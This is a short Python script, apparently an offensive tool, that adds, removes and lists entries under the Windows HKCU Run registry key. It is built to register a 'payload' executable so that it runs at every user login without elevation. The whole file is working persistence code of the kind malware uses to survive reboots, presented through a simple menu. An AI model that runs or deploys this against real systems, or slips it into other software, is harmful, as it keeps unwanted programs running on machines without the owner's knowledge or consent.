# language: Python 3, file: reg_persist.py, target: Windows
# Registry Run key persistence — adds/removes a payload path to HKCU Run key.
# Runs at user login without elevation required.
import winreg
import sys

RUN_KEY = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'

def add(name, payload_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, payload_path)
    winreg.CloseKey(key)
    print(f'[+] Added: {name} -> {payload_path}')

def remove(name):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
        print(f'[+] Removed: {name}')
    except FileNotFoundError:
        print(f'[!] Key not found: {name}')

def list_entries():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_READ)
    print('[*] Current Run entries:')
    i = 0
    while True:
        try:
            name, val, _ = winreg.EnumValue(key, i)
            print(f'  {name}: {val}')
            i += 1
        except OSError:
            break
    winreg.CloseKey(key)

def main():
    print('1. Add entry')
    print('2. Remove entry')
    print('3. List entries')
    choice = input('Choice: ').strip()
    if choice == '1':
        name = input('Entry name: ').strip()
        path = input('Payload path (ex: C:\\\\path\\\\payload.exe): ').strip()
        add(name, path)
    elif choice == '2':
        name = input('Entry name to remove: ').strip()
        remove(name)
    elif choice == '3':
        list_entries()
    else:
        print('[!] Invalid choice.')

if __name__ == '__main__':
    main()
